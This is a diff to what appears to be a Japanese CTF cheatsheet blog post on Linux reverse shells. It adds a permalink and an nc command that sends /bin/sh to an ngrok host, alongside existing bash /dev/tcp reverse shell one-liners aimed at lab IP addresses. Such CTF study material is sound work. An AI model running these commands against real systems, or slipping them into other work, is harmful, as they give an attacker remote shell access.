@@ -2,6 +2,7 @@
 layout: post
 title: "linux_reverse_shell"
 published : true
+permalink: /ctf/cheatsheets/common/linux_reverse_shell
 tags: CTF Common cheatsheet linux "reverse shell"
 ---
 ## リバースシェル
@@ -17,6 +18,11 @@ bash -i >& /dev/tcp/10.10.14.14/7777 0>&1
 ```sh
 'bash -c "bash -i >& /dev/tcp/10.10.14.4/443 0>&1"'
 ```
+- コマンド4
+```sh
+nc 0.tcp.jp.ngrok.io:14497 -e /bin/sh
+```
+
 ## シェルのアップグレード
 ```
 script /dev/null -c bash
